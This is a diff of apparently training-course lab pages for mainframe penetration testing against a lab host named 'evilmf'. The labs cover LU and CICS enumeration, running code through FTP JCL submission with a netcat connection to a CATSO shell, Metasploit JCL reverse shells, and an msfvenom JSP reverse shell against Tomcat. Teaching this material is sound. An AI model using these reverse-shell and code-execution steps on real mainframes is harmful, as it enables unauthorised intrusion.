@@ -167,7 +167,7 @@ Error message and password prompt
 
 <li>Lab 5 - Hacking Tomcat</li>
 
-<li>Lab 6 - Commands</li>
+<li>Lab 6 - z/OS Enumeration</li>
 
 </ul>
 </p>
@@ -8737,7 +8737,7 @@ Error message and password prompt
 <div created="20181014055436789" modified="20181014055442877" title="$:/state/tab/sidebar--1835078512">
 <pre>$:/core/ui/SideBar/Open</pre>
 </div>
-<div list="[[Lab 1 - Enumeration]] [[Lab 2 - Headless Interaction]] [[Lab 3 - FTP Code Execution]] [[Lab 4 - Metasploit]] [[Lab 5 - Hacking Tomcat]] [[Lab 6 - Commands]]" title="$:/StoryList">
+<div list="[[Lab 1 - Enumeration]] [[Lab 2 - Headless Interaction]] [[Lab 3 - FTP Code Execution]] [[Lab 4 - Metasploit]] [[Lab 5 - Hacking Tomcat]] [[Lab 6 - z/OS Enumeration]]" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -8753,7 +8753,7 @@ Error message and password prompt
         },
         &quot;$:/info/url/full&quot;: {
             &quot;title&quot;: &quot;$:/info/url/full&quot;,
-            &quot;text&quot;: &quot;file:///Users/chad/WorkInProgress/EM_Labs/Day_2/Day2_Labs.html&quot;
+            &quot;text&quot;: &quot;file:///Users/phil/DEV/EvilMainframe/Labs/Day_2/Day2_Labs.html&quot;
         },
         &quot;$:/info/url/host&quot;: {
             &quot;title&quot;: &quot;$:/info/url/host&quot;,
@@ -8773,7 +8773,7 @@ Error message and password prompt
         },
         &quot;$:/info/url/pathname&quot;: {
             &quot;title&quot;: &quot;$:/info/url/pathname&quot;,
-            &quot;text&quot;: &quot;/Users/chad/WorkInProgress/EM_Labs/Day_2/Day2_Labs.html&quot;
+            &quot;text&quot;: &quot;/Users/phil/DEV/EvilMainframe/Labs/Day_2/Day2_Labs.html&quot;
         },
         &quot;$:/info/url/search&quot;: {
             &quot;title&quot;: &quot;$:/info/url/search&quot;,
@@ -8785,11 +8785,11 @@ Error message and password prompt
         },
         &quot;$:/info/browser/screen/width&quot;: {
             &quot;title&quot;: &quot;$:/info/browser/screen/width&quot;,
-            &quot;text&quot;: &quot;1280&quot;
+            &quot;text&quot;: &quot;1440&quot;
         },
         &quot;$:/info/browser/screen/height&quot;: {
             &quot;title&quot;: &quot;$:/info/browser/screen/height&quot;,
-            &quot;text&quot;: &quot;800&quot;
+            &quot;text&quot;: &quot;900&quot;
         }
     }
 }</pre>
@@ -8906,8 +8906,14 @@ Error message and password prompt
     }
 }</pre>
 </div>
-<div created="20181014031150411" modified="20181024065140057" tags="" title="Lab 1 - Enumeration">
-<pre>!!''Logical Unit Enumeration''
+<div created="20181014031150411" modified="20181105174123130" tags="" title="Lab 1 - Enumeration">
+<pre>!!''Lab Objectives''
+# Learning how to obtain Logical Unit (LU)
+# Using s3270 to enumerate LUs
+# Using Nmap to enumerate VTAM application IDs
+# Optional: Enumerate CICS transaction IDs
+
+!!''Logical Unit Enumeration''
 
 !!!''Obtain LU name''
 
@@ -9000,7 +9006,7 @@ unpwdb.timelimit=0
 ```
 ---
 
-!!''Bonus'': CICS Transaction ID Enumeration
+!!''OPTIONAL'': CICS Transaction ID Enumeration
 This is optional. Please make sure brute.delay is set to a high number or you will get booted.
 
 * Read the Nmap script arguments very carefully
@@ -9021,14 +9027,16 @@ cics-enum.path=/&lt;folder&gt;/
 
 </pre>
 </div>
-<div created="20181014034708433" modified="20181014040230239" tags="" title="Lab 2 - Headless Interaction">
-<pre>Using Python and s3270 write a script to logon to the mainframe. Once logged on issue the TSO command `LISTCAT`
+<div created="20181014034708433" modified="20181105175437540" tags="" title="Lab 2 - Headless Interaction">
+<pre>!!''Lab Objectives''
+# Use Python and s3270 to logon to the mainframe
+# Non-interactively issue the TSO command `LISTCAT`
 
 !!''Python tn3270lib''
 
 Take the ''python'' script below, save it and execute it
 
-''Note'' Ensure you are completely logged out or this script will ''reconnect'' and the commands will fail
+''Note:'' Ensure you are completely logged out or this script will ''reconnect'' and the commands will fail
 
 
 ```
@@ -9056,11 +9064,11 @@ tn.send_enter()
 
 Take the bash script below and get the output from `LISTCAT`
 
-Of note:
+Please note:
 
 * It is incomplete
 * It will only get you so far as logged in
-** Step through how you log on, what do you need to press to get `READY`
+** When you use x3270 what are the steps you need to go through to get the `READY` prompt?
 * Call the script with 'three' argument:
 # s3270 host `L:evilmf:992`
 # Your userid
@@ -9071,7 +9079,8 @@ s3270 scripting args explained:
 * `Wait(InputField)` - Waits until the server is ready to get input
 * `PrintText(string)` - Prints the current tn3270 buffer to the screen
 * `Enter` - Sends one press of the enter key
-* `String(&quot;&lt;string&gt;&quot;)` - Sends whatever string to the screen ''NOTE'' it does not send an enter, you either need to send `Enter` after this command or prepend your string with `\n`
+* `String(&quot;&lt;string&gt;&quot;)` - Sends whatever string to the screen
+** ''NOTE:'' `String()` does not send an enter, you either need to send `Enter` after this command or append your string with `\n`
 
 
 
@@ -9094,14 +9103,24 @@ String(&quot;$3\n&quot;)
 EOF
 ```</pre>
 </div>
-<div created="20181014040322322" modified="20181014044044907" tags="" title="Lab 3 - FTP Code Execution">
-<pre>!!''JCL''
+<div created="20181014040322322" modified="20181105180647548" tags="" title="Lab 3 - FTP Code Execution">
+<pre>!!''Lab Objectives''
+# Edit JCL in linux
+# Use FTP to upload and run JCL
+# Use FTP to download job results
+# Use TShOcker to generate JCL with CATSO
+# Use FTP to run the generated JCL
+# Interact with CATSO to explore z/OS
+# Optional: Automate the process with TShOcker
+
+!!''JCL''
 
 Copy this JCL, edit it and put it in the linux filesystem
 
-* ''NOTE'' the jobcard is ''missing!'' 
-* You can copy/paste that from a previous lab (i.e. Day 1 LAB 1 or `&lt;userid&gt;.JCLLIB(LAB01)`). 
-* Follow the jobcard DOs and DONTs from the Day 1 Notes
+* ''NOTE:'' the jobcard is ''missing!'' 
+* A jobcard is the very first line (and its continuation) in a JCL file
+* You can copy/paste a jobcard from a previous lab (i.e. Day 1 LAB 1 or `&lt;userid&gt;.JCLLIB(LAB01)`). 
+* Follow the jobcard DOs and DONTs from the Notes wiki
 
 ```
 //&lt;&lt;JOBCARD&gt;&gt;
@@ -9149,15 +9168,17 @@ The following steps will execute some REXX code using JCL, REXX and FTP.
 * Enter in to JES mode: `SITE FILE=JES`
 * Upload JCL_REXX: `PUT JCL_REXX`
 * Once the upload is complete connect with netcat to the random port you chose to replace `&lt;choose a port&gt;` with: `nc -nv evilmf 46290`
-** If it fails to connect retry the JCL may take a bit to process
+** If netcat fails to connect, wait 30 seconds and try again. It may take up to a minute (or more depending on load) for the JCL to finish running
 
-''Commands''
+''CATSO Commands''
+
 * Type `help` to get a list of commands
-* Try and run TSO commands `LU` and `search all warning nomask`
+* Try and run TSO commands `LU` and `SEARCH ALL WARNING NOMASK`
 * Try and get system information
+* Try and run USS (i.e. UNIX) commands
 
 ---
-!!''BONUS'' TShOcker
+!!''OPTIONAL'' TShOcker
 
 Use ''TShOcker'' to automate this whole process and get a reverse CATSO connection back
 
@@ -9167,8 +9188,11 @@ Use the `--help` flag and read the documentation to accomplish
 
 </pre>
 </div>
-<div created="20181014044107306" modified="20181025030329337" tags="" title="Lab 4 - Metasploit">
-<pre>!!''Using Metasploit to Connect/Execute''
+<div created="20181014044107306" modified="20181105181951626" tags="" title="Lab 4 - Metasploit">
+<pre>!!''Lab Objectives''
+# Use metasploit natively to obtain a reverse USS shell
+
+!!''Using Metasploit to Connect/Execute''
 * The  metasploit exploit `ftp_jcl_creds` uses the command `SITE FILE=JES` to run HLASM
 * The payload `reverse_shell_jcl` is a reverse Unix shell written in JCL and HLASM
 * ''RHOST'' is the target FTP server
@@ -9192,8 +9216,13 @@ Use the `--help` flag and read the documentation to accomplish
 
 ''Note:''  You will not be 'able' to execute this `apf_privesc_jcl`, this is an analysis question only.</pre>
 </div>
-<div created="20181014050649961" modified="20181025030013686" tags="" title="Lab 5 - Hacking Tomcat">
-<pre>!!''Find the Tomcat Server''
+<div created="20181014050649961" modified="20181105182129555" tags="" title="Lab 5 - Hacking Tomcat">
+<pre>!!''Lab Objectives''
+# Using Nmap to find web servers
+# Using Metasploit to obtain a reverse shell using Tomcat
+# Using Unix commands to run TSO commands
+
+!!''Find the Tomcat Server''
 Use nmap, with default options and -sV to find the Tomcat server running:
 
 `nmap -sV evilmf`
@@ -9225,8 +9254,14 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Y
 * Which user are you running commands as?
 * What ''attributes'' does this account have?</pre>
 </div>
-<div created="20181014052417597" modified="20181014055427701" tags="" title="Lab 6 - Commands">
-<pre>!!''List APF Authorized Libraries''
+<div created="20181014052417597" modified="20181105182729982" tags="" title="Lab 6 - z/OS Enumeration">
+<pre>!!''Lab Objectives''
+# Use multiple methods to identify APF authorized libraries
+# Use REXX script to identify RACF configueation items
+# Use RACF `SEARCH` to identify what datasets you might have access to
+# Use REXX to identify current dataset concatenation
+
+!!''List APF Authorized Libraries''
 
 There are multiple ways to list the APF Authorized Libraries:
 
